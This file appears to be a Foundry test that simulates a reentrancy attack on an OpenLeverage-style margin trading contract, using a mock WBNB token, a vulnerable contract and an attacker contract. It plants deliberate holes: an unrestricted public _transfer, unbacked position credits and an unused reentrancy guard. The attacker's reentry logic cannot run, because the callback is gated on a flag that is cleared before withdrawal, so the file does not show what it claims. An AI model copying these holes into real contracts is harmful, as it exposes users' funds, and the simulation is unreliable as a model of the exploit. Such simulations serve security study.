// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

/// @title OpenLeverage Reentrancy Attack Simulation
/// @author Zurab Anchabadze

import {Test} from "../lib/forge-std/src/Test.sol";
import {console} from "../lib/forge-std/src/console.sol";

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IWBNB is IERC20 {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

contract MockWBNB {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor() payable {
        balanceOf[address(this)] = 1000000 ether;
    }

    function deposit() external payable {
        balanceOf[msg.sender] += msg.value;
    }

    function withdraw(uint256 amount) external {
        require(balanceOf[msg.sender] >= amount, "Insufficient balance");
        balanceOf[msg.sender] -= amount;
        (bool success,) = payable(msg.sender).call{value: amount}("");
        require(success, "Transfer failed");
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        return _transfer(msg.sender, to, amount);
    }

    function _transfer(address from, address to, uint256 amount) public returns (bool) {
        if (from == address(this)) {
            require(balanceOf[address(this)] >= amount, "Insufficient contract balance");
            balanceOf[address(this)] -= amount;
            balanceOf[to] += amount;
        } else {
            require(balanceOf[from] >= amount, "Insufficient balance");
            balanceOf[from] -= amount;
            balanceOf[to] += amount;
        }
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    receive() external payable {
        balanceOf[msg.sender] += msg.value;
    }
}

contract VulnerableOpenLeverage {
    mapping(address => mapping(uint16 => uint256)) public positions;
    mapping(address => mapping(uint16 => uint256)) public borrows;
    MockWBNB public wbnb;
    bool private locked;

    constructor(address payable _wbnb) {
        wbnb = MockWBNB(_wbnb);
        wbnb._transfer(address(wbnb), address(this), 100000 ether);
    }

    modifier nonReentrant() {
        require(!locked, "ReentrancyGuard: reentrant call");
        locked = true;
        _;
        locked = false;
    }

    function marginTrade(
        uint16 marketId,
        bool longToken,
        bool depositToken,
        uint256 deposit,
        uint256 borrow,
        uint256 minBuyAmount,
        address to,
        bytes memory dexData
    ) external payable {
        positions[msg.sender][marketId] += deposit + borrow;
        borrows[msg.sender][marketId] += borrow;

        if (msg.value > 0) {
            wbnb.deposit{value: msg.value}();
        }
    }

    function payoffTrade(uint16 marketId, bool longToken, uint256 amount) external {
        require(positions[msg.sender][marketId] >= amount, "Insufficient position");

        positions[msg.sender][marketId] -= amount;
        if (borrows[msg.sender][marketId] > 0) {
            borrows[msg.sender][marketId] -= amount;
        }

        wbnb._transfer(address(this), msg.sender, amount);
    }

    function liquidate(address owner, uint16 marketId, bool longToken, address to, uint256 minBuy) external {
        uint256 position = positions[owner][marketId];
        uint256 borrow = borrows[owner][marketId];

        if (position > 0 && borrow > 0) {
            positions[owner][marketId] = 0;
            borrows[owner][marketId] = 0;

            uint256 liquidationReward = position / 10;
            wbnb._transfer(address(this), msg.sender, liquidationReward);
        }
    }
}

contract ReentrancyAttacker {
    VulnerableOpenLeverage public openLeverage;
    MockWBNB public wbnb;
    address public owner;
    uint256 public attackStep;
    bool public isAttacking;

    constructor(address _openLeverage, address payable _wbnb) {
        openLeverage = VulnerableOpenLeverage(_openLeverage);
        wbnb = MockWBNB(_wbnb);
        owner = msg.sender;
    }

    receive() external payable {
        if (isAttacking && attackStep < 3 && msg.sender == address(wbnb)) {
            attackStep++;

            uint256 balance = address(this).balance;
            if (balance > 0.1 ether) {
                wbnb.deposit{value: balance / 2}();
                openLeverage.payoffTrade(1, true, balance / 4);
            }
        }
    }

    function attack() external payable {
        require(msg.sender == owner, "Only owner");
        isAttacking = true;
        attackStep = 0;

        wbnb.deposit{value: msg.value}();
        wbnb.approve(address(openLeverage), type(uint256).max);

        openLeverage.marginTrade{value: 0}(1, true, true, msg.value, msg.value, 0, address(this), "");

        openLeverage.liquidate(address(this), 1, true, address(this), 0);

        isAttacking = false;

        uint256 wbnbBalance = wbnb.balanceOf(address(this));
        if (wbnbBalance > 0) {
            wbnb.withdraw(wbnbBalance);
        }

        payable(owner).transfer(address(this).balance);
    }
}

contract OpenLeverageReentrancyTest is Test {
    MockWBNB wbnb;
    VulnerableOpenLeverage openLeverage;
    ReentrancyAttacker attacker;

    address user = makeAddr("user");

    function setUp() public {
        wbnb = new MockWBNB();
        openLeverage = new VulnerableOpenLeverage(payable(address(wbnb)));

        vm.deal(address(wbnb), 1000 ether);
        vm.deal(user, 100 ether);

        vm.startPrank(user);
        attacker = new ReentrancyAttacker(address(openLeverage), payable(address(wbnb)));
        vm.stopPrank();
    }

    function testOpenLeverageReentrancyAttack() public {
        vm.startPrank(user);

        uint256 initialBalance = user.balance;
        console.log("Initial user balance:", initialBalance);

        uint256 attackAmount = 10 ether;
        console.log("Starting reentrancy attack with:", attackAmount);

        attacker.attack{value: attackAmount}();

        uint256 finalBalance = user.balance;
        console.log("Final user balance:", finalBalance);

        if (finalBalance > initialBalance) {
            console.log("Attack succeeded! Profit:", finalBalance - initialBalance);
        } else {
            console.log("Attack did not profit");
        }

        vm.stopPrank();
    }
}
